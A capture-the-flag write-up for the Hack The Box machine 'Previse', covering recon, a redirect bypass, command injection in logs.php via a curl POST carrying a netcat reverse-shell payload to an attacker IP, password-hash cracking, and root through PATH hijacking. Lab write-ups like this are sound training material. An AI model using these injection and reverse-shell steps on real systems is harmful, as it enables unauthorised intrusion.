# Previse

First as always, we start with `nmap`

```
# Nmap 7.92 scan initiated Tue Aug 24 13:27:08 2021 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.11.104
Nmap scan report for box.ip (10.10.11.104)
Host is up, received conn-refused (0.063s latency).
Scanned at 2021-08-24 13:27:08 +07 for 10s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
| http-title: Previse Login
|_Requested resource was login.php
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 24 13:27:18 2021 -- 1 IP address (1 host up) scanned in 10.48 seconds
```

Visiting the web service on port 80, we're redirected to `/login.php`. At this point, I probed for SQL injection and tried some weak credentials but to no avail, so I ran `gobuster`.

```
/.                    (Status: 200) [Size: 2224]
/accounts.php         (Status: 200) [Size: 2224]
/config.php           (Status: 200) [Size: 0]
/css                  (Status: 200) [Size: 933]
/download.php         (Status: 200) [Size: 2224]
/files.php            (Status: 200) [Size: 2224]
/footer.php           (Status: 200) [Size: 217]
/header.php           (Status: 200) [Size: 980]
/index.php            (Status: 200) [Size: 2224]
/js                   (Status: 200) [Size: 1149]
/login.php            (Status: 200) [Size: 2224]
/logout.php           (Status: 200) [Size: 2224]
/logs.php             (Status: 200) [Size: 2224]
/nav.php              (Status: 200) [Size: 1248]
/server-status        (Status: 403) [Size: 271]
/status.php           (Status: 200) [Size: 2224]
```

Of the found PHP pages, only `nav.php` doesn't redirect to `login.php` and is a complete page. The page has several links. However, all the links just seem to ultimately redirect to `/login.php`. For further investigation, we intercept the requests in Burp. However, just intercepting the requests don't reveal anything especially interesting, so we'll also intercept the responses. Among the intercepted responses, that of the request to the page "create account" seems to have the code for a complete page, but its response code is 302 Found which redirects us to `/login.php`. To view the actual page without redirection, we change the response code to be "200 OK" and forward it to the browser. With this, we can create a user an log in.

Having logged in, we can view more pages, of which the page "Files" (`files.php`) has the file "SITEBACKUP.ZIP" we can download. Unzipping the back up file, we get several PHP files, of which `config.php` contains database credentials. I tried using the found password to log into SSH, as well as the web site as another user, but that didn't work so we go back to the source code.

Looking at `logs.php`, we see an `exec` call.

```python
$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
```

We can make a POST request, in which we use the paramater `delim` by ending the command and starting a new command to get us a reverse shell. Using the payload `nc ATK_IP ATK_PORT -e /bin/bash`, we make the POST request with `curl`

```sh
$ curl -X POST "http://box.ip/logs.php" --cookie "PHPSESSID=<REDACTED>" --data "delim=comma;nc+10.10.16.4+1337+-e+%2Fbin%2Fbash"
```

With this, we should have a reverse shell as `www-data`.

Going back to `config.php`, we log in as `root` and look around at the database "previse". With in "previse", there's the table "accounts" with salted and hashed passwords. With `hashcat` (mode 500), we're able to crack m4lwhere's password, giving us `ilovecody112235!`. We can then run `su m4lwhere` or SSH in.

With a shell as m4lwhere, we check our `sudo` privileges.

```sh
m4lwhere@previse:~$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh

m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```

We see that we're able to run `/opt/scripts/access_backup.sh` as root. Additionally, inside the script, `gzip` is being called *without* the full path, thus we can attempt PATH hijacking. To do this, we create a `gzip` file somewhere we can write to with a reverse shell to our machine. We then open a listener and run the following:

```sh
chmod +x gzip
export PATH=.:$PATH
sudo /opt/scripts/access_backup.sh
```

With this, we should have a root shell on the machine.
